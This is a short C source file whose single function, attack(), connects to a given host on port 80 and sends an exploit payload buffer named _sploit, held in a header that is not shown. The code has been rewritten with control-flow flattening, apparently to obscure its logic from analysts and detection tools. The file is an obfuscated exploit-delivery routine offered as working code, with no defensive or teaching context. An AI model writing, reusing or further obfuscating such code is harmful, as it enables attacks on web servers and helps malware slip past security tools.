#pragma optimize("", off)

#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

void attack(char *hostname) {
    SOCKET s;
    struct hostent *he;
    SOCKADDR_IN addr;
    int i;
    volatile int ctrl_state = 1;   // state variable for control flow flattening

    // Dispatcher
ctrl_dispatcher:
    if (ctrl_state == 0) goto ctrl_end;
    if (ctrl_state == 1) goto ctrl_block1;
    if (ctrl_state == 2) goto ctrl_block2;
    if (ctrl_state == 3) goto ctrl_block3;
    if (ctrl_state == 4) goto ctrl_block4;
    if (ctrl_state == 5) goto ctrl_block5;

ctrl_block1:
    // Original block 1: socket creation
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 2;
    goto ctrl_dispatcher;

ctrl_block2:
    // Original block 2: gethostbyname
    he = gethostbyname(hostname);
    if (!he) {
        closesocket(s);
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 3;
    goto ctrl_dispatcher;

ctrl_block3:
    // Original block 3: memset and address setup
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = *((unsigned long *)he->h_addr_list[0]);
    addr.sin_port = htons(80);
    ctrl_state = 4;
    goto ctrl_dispatcher;

ctrl_block4:
    // Original block 4: connect
    i = connect(s, (struct sockaddr *)&addr, sizeof(addr));
    if (i != 0) {
        closesocket(s);
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 5;
    goto ctrl_dispatcher;

ctrl_block5:
    // Original block 5: send and closesocket
    send(s, (const char *)_sploit, sizeof(_sploit), 0);
    closesocket(s);
    ctrl_state = 0;
    goto ctrl_dispatcher;

ctrl_end:
    // Function end
    return;
}

#pragma optimize("", on)
